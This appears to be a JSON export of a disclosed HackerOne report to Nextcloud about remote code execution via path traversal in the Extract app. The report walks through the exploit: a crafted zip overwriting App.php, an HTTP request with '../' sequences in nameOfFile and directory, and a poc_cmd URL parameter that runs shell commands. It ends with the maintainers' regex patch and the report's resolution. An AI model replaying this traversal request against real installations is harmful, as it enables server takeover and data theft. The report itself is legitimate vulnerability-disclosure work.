@@ -1,0 +1,379 @@
+{
+    "id": 765291,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjUyOTE=",
+    "url": "https://hackerone.com/reports/765291",
+    "title": "Remote code execution via path traversal in Zip extraction in the Extract app",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "high",
+    "readable_substate": "Resolved",
+    "created_at": "2019-12-27T23:07:56.864Z",
+    "submitted_at": "2019-12-27T23:07:56.864Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "emilvirkki",
+        "url": "/emilvirkki",
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 13291,
+        "url": "https://hackerone.com/nextcloud",
+        "handle": "nextcloud",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Nextcloud",
+            "twitter_handle": "nextclouders",
+            "website": "https://nextcloud.com",
+            "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2020-03-07T12:54:55.538Z",
+    "bug_reporter_agreed_on_going_public_at": null,
+    "team_member_agreed_on_going_public_at": "2020-02-06T12:54:55.135Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "I realise this doesn't qualify for a reward, as it's a vulnerability in a third-party app, but as the app is part of the \"official\" VM image provided by Hansson IT, I think it's well worth fixing.\n\nThe Extract app doesn't validate the path or filename of a zip file to be extracted, allowing an attacker to create or overwrite arbitrary files.\n\nHow to reproduce\n===\n\nInstall NextCloud using the VM image with default settings (with the extra security options).\n\nCreate a new user with no user group and log in as that user.\n\nUpload the payload zip file (nextcloud-shell.zip, attached) to the root folder (or wherever you like). It contains a modified version of apps/files/App.php, necessary for getting the payload to run.\n\nClick the \"Extract here\" option for the nextcloud-shell.zip and intercept the request. Modify the **request body** so the request looks something like the following. You need to replace \"normaluser\" with the username of the user you created in (2):\n\n```\nPOST /index.php/apps/extract/ajax/extractHere.php HTTP/1.1\nHost: 192.168.100.32\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: */*\nAccept-Language: fi-FI,fi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken: lv0G5+K7v/a3w30wOMyR35SvBgF35GHmiuoejP+8u7g=:w5s+qIPUj8aAohdpWojkiazdVXYRkwyp47t8ypHy/+4=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 55\nOrigin: https://192.168.100.32\nDNT: 1\nConnection: close\nCookie: ocmmdvtkydkx=1u2e2imt5h7g0pimv84eoqnfco; oc_sessionPassphrase=MXmMNXhcE3%2FpbZla9mKTYIS18lYG49cMP8lTHFrJfGe1jLxHd2hHfg8vYs1O6hFjv2IbkI31jhMeJnajKWNYzIb7G3f9UNiFmyKJwAbzPWLKY594ScipzPr6u%2BN9SUp3; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; nc_username=normaluser; nc_token=FkBWj5z2dOJS0v4putAyW2oL7tAEOc9Q; nc_session_id=1u2e2imt5h7g0pimv84eoqnfco\n\nnameOfFile=../../../../../../mnt/ncdata/normaluser/files/nextcloud-shell.zip&directory=/../../../../var/www/nextcloud/apps/files/lib&external=0\n```\n\nOpen the following URL (replace host ip with your actual install) and observe how the current user and group are printed: `https://192.168.100.32/apps/files/?dir=/&poc_cmd=whoami`. You can obviously change the poc_cmd parameter to run any command you like.\n\n## Impact\n\nThe attacker can run any commands with the privileges of the www-data user. This allows the attacker to access and modify all the files and personally identifiable information in the installation.",
+    "weakness": {
+        "id": 19,
+        "name": "Path Traversal"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 670123,
+            "file_name": "nextcloud-shell.zip",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5Mh2dyHyxTcwGZKe1fmocZ91?response-content-disposition=attachment%3B%20filename%3D%22nextcloud-shell.zip%22%3B%20filename%2A%3DUTF-8%27%27nextcloud-shell.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ44TLZFA6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072551Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCm8A5VicKSFdKk4pT1CD%2B9aD8whwsKjbgyswTJtjuCwwIgbQkNA5LWAijPuPYCLq2qw1BsS6Km0Nr%2BSAzJkxT%2F5rAquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAUh5bnfX42OeHzAHCqPBUk2d8HAsYNgcRvKeT%2Ftc%2FDmhEt%2BerxJO7sajeYJjcelj5odT9W%2BTjlYl%2FmZpvLn2NiyiCQF9Wk4UHySsA0Oh4Uy6pfeocYAP0EKkS1IkVCEN4YmtMmlZyEn0SMPDogzrH%2B4Ed7VuR54IPkzn2euwtWjhFaoiB2RLVqGBd%2B3e%2BLlXfdpHvvGfAAJ83tKHpZ1yhkO4u%2B2kTkemBBR4lSYuCVoWFlhWFlkmAVIkqUlvhoH5GuaCdNomHfYVz%2BbqDpMHPZrvySz7mACWoEt4Qwrs8Gyc%2BkTdPZaB%2F46k9vOi0Lko2Zc5Pt7N1%2FpAzZKupnNrcebhhPktqHvghxuPXdBkaa6NywOX8Mj7J3vmJYUPDMjNLY9RL9TloFCSyL%2BH7e9vgnNVP7WFvFBgt3yUqy6VR%2BVwCsXW9rXX5iUoiQr952qwjX%2BCBjmbl50%2BefXi3eA6h%2FrW8sbQNY8ZLGU3811e6J6ZxIcsGKFT6%2BNe1mlCEvaagQVBSwgft9Qvw5G933uZkkIIRrecVrrxV1Kdyf18UuksHfwWvoPsxTVqLghh1fsH9QzD5tW58%2FuV%2BDHNjcO0Y7MfQZYf%2F1KIm3T12pyBS%2BByAc4M%2B4H%2BznSX1O17idlgZ4aptmYnQdIAYPd1qvB9lGCmmvvyGrknfkQaumBhDcQRGSxQFRN7cUVHj1ZxM08uZpmvLxXBbtA%2BhkRMuKZUZROk8poKap2OCWR%2Fr5QTQpIvE0RO0BqlOYwF8g6GjE%2BJfumo%2B%2BP2Uarii4%2Bi4%2BnE6cXCeTiqSJSit9AKwwjsJnpBl2IgfTN1pfXYi5HjCgmBb3PWeFvRjFiLm8dOZgU7wZl749NK%2F25A2jO3VQqu5SUZmK0%2B89WyBYfPCX8vU4wlrC2pwY6sQGYpjFrGNKqUhFm3ihi0%2Fxb68dwJpw2ByqbkEntVKLgVrut%2FErgh8ywfClfdrPrYCeAtSFYHBUVlsWTASBv82isMRBVL%2BvEfK0fjMoUXbiSGB9RIsWYEaAFc2AlCy%2F7ArBadwZY9ywlDeeztTmEKiauvWxW%2FbQ7z5x5fmIylqk1nm%2Fr%2BPnkssGbY5t572aOr%2B1M2PUkmomm8AQ%2FOb5Mm0Wx0dRE01Xqm0W4DAD%2F9JIWsTA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=306d2b4a96709f3552d3571c2fcc1959b9839d87fe7b7e52525e8fb30d50483b",
+            "file_size": 1094,
+            "type": "application/zip"
+        }
+    ],
+    "allow_singular_disclosure_at": "2020-03-07T12:54:55.230Z",
+    "allow_singular_disclosure_after": -109708256.49887717,
+    "singular_disclosure_allowed": true,
+    "vote_count": 38,
+    "voters": [
+        "saulius",
+        "aituglo",
+        "a_d_a_m",
+        "yvvdwf",
+        "tess",
+        "az1441",
+        "nkx",
+        "h4x0r_dz",
+        "mayurudiniya",
+        "sodium_",
+        "and 28 more..."
+    ],
+    "severity": {
+        "rating": "high",
+        "score": 8.8,
+        "author_type": "User",
+        "metrics": {
+            "attack_vector": "network",
+            "attack_complexity": "low",
+            "privileges_required": "low",
+            "user_interaction": "none",
+            "scope": "unchanged",
+            "confidentiality": "high",
+            "integrity": "high",
+            "availability": "high"
+        }
+    },
+    "structured_scope": {
+        "databaseId": 42,
+        "asset_type": "URL",
+        "asset_identifier": "apps.nextcloud.com",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 6638064,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.",
+            "automated_response": true,
+            "created_at": "2019-12-27T23:07:57.151Z",
+            "updated_at": "2019-12-27T23:07:57.151Z",
+            "actor": {
+                "url": "/nextcloud",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Nextcloud"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "nextcloud"
+        },
+        {
+            "id": 6707916,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks for reporting.\n\nDefinitly the right decision.\n\nI will contact the owner of the app and make sure it's fixed soon",
+            "automated_response": false,
+            "created_at": "2020-01-07T13:22:25.880Z",
+            "updated_at": "2020-01-07T13:22:25.880Z",
+            "actor": {
+                "username": "nickvergessen",
+                "cleared": false,
+                "verified": false,
+                "url": "/nickvergessen",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nextcloud"
+        },
+        {
+            "id": 6707917,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-01-07T13:22:34.558Z",
+            "updated_at": "2020-01-07T13:22:34.558Z",
+            "actor": {
+                "username": "nickvergessen",
+                "cleared": false,
+                "verified": false,
+                "url": "/nickvergessen",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nextcloud"
+        },
+        {
+            "id": 6707920,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::NotEligibleForBounty",
+            "message": "Not eligible for a bounty because it's a 3rd party app.",
+            "automated_response": false,
+            "created_at": "2020-01-07T13:23:06.817Z",
+            "updated_at": "2020-01-07T13:23:06.817Z",
+            "actor": {
+                "url": "/nextcloud",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Nextcloud"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "nextcloud"
+        },
+        {
+            "id": 6707922,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::SwagAwarded",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-01-07T13:23:14.289Z",
+            "updated_at": "2020-01-07T13:23:14.289Z",
+            "actor": {
+                "url": "/nextcloud",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Nextcloud"
+                }
+            },
+            "reporter": {
+                "username": "emilvirkki",
+                "url": "/emilvirkki"
+            },
+            "genius_execution_id": null,
+            "team_handle": "nextcloud"
+        },
+        {
+            "id": 6708483,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Can you confirm that the following patch is enough to prevent the issue?\n\n```diff\ndiff --git a/lib/Controller/ExtractionController.php b/lib/Controller/ExtractionController.php\nindex a0dc4fb..a46fce2 100644\n--- a/lib/Controller/ExtractionController.php\n+++ b/lib/Controller/ExtractionController.php\n@@ -40,6 +40,14 @@ class ExtractionController extends Controller {\n        */\n \n        public function extractHere($nameOfFile, $directory, $external, $shareOwner = null) {\n+               if (preg_match('/(\\/|^)\\.\\.(\\/|$)/', $nameOfFile)) {\n+                       $response = ['code' => 0, 'desc' => 'Can\\'t find zip file'];\n+                       return json_encode($response);\n+               }\n+               if (preg_match('/(\\/|^)\\.\\.(\\/|$)/', $directory)) {\n+                       $response = ['code' => 0, 'desc' => 'Can\\'t open zip file at directory'];\n+                       return json_encode($response);\n+               }\n                if (!extension_loaded (\"zip\")){\n                        $response = array_merge($response, array(\"code\" => 0, \"desc\" => $this->l->t(\"Zip extension is not available\")));\n                        return json_encode($response);\n@@ -81,6 +89,14 @@ class ExtractionController extends Controller {\n        * @NoAdminRequired\n        */\n        public function extractHereRar($nameOfFile, $directory, $external, $shareOwner = null) {\n+               if (preg_match('/(\\/|^)\\.\\.(\\/|$)/', $nameOfFile)) {\n+                       $response = ['code' => 0, 'desc' => 'Can\\'t find rar file'];\n+                       return json_encode($response);\n+               }\n+               if (preg_match('/(\\/|^)\\.\\.(\\/|$)/', $directory)) {\n+                       $response = ['code' => 0, 'desc' => 'Can\\'t open rar file at directory'];\n+                       return json_encode($response);\n+               }\n                $response = array();\n                if ($external){\n                        $externalMountPoints = $this->getExternalMP();\n@@ -159,6 +175,14 @@ class ExtractionController extends Controller {\n        * @NoAdminRequired\n        */\n        public function extractHereOthers($nameOfFile, $directory, $external, $shareOwner = null) {\n+               if (preg_match('/(\\/|^)\\.\\.(\\/|$)/', $nameOfFile)) {\n+                       $response = ['code' => 0, 'desc' => 'Can\\'t find file'];\n+                       return json_encode($response);\n+               }\n+               if (preg_match('/(\\/|^)\\.\\.(\\/|$)/', $directory)) {\n+                       $response = ['code' => 0, 'desc' => 'Can\\'t open file at directory'];\n+                       return json_encode($response);\n+               }\n                $response = array();\n                if ($external){\n                        $externalMountPoints = $this->getExternalMP();\n```",
+            "automated_response": false,
+            "created_at": "2020-01-07T14:19:10.264Z",
+            "updated_at": "2020-01-07T14:19:10.264Z",
+            "actor": {
+                "username": "nickvergessen",
+                "cleared": false,
+                "verified": false,
+                "url": "/nickvergessen",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nextcloud"
+        },
+        {
+            "id": 6749583,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "The patch looks sufficient to me :)",
+            "automated_response": false,
+            "created_at": "2020-01-12T23:13:08.842Z",
+            "updated_at": "2020-01-12T23:13:08.842Z",
+            "actor": {
+                "username": "emilvirkki",
+                "cleared": false,
+                "verified": false,
+                "url": "/emilvirkki",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nextcloud"
+        },
+        {
+            "id": 6978474,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Thanks a lot for your report again. This has been resolved in the latest maintenance releases.",
+            "automated_response": false,
+            "created_at": "2020-02-06T12:54:48.689Z",
+            "updated_at": "2020-02-06T12:54:48.689Z",
+            "actor": {
+                "username": "nickvergessen",
+                "cleared": false,
+                "verified": false,
+                "url": "/nickvergessen",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "emilvirkki",
+                "url": "/emilvirkki"
+            },
+            "genius_execution_id": null,
+            "team_handle": "nextcloud"
+        },
+        {
+            "id": 6978475,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-02-06T12:54:55.163Z",
+            "updated_at": "2020-02-06T12:54:55.163Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "nickvergessen",
+                "cleared": false,
+                "verified": false,
+                "url": "/nickvergessen",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "nextcloud"
+        },
+        {
+            "id": 7251505,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-03-07T12:54:55.567Z",
+            "updated_at": "2020-03-07T12:54:55.567Z",
+            "actor": {
+                "url": "/nextcloud",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Nextcloud"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "nextcloud"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
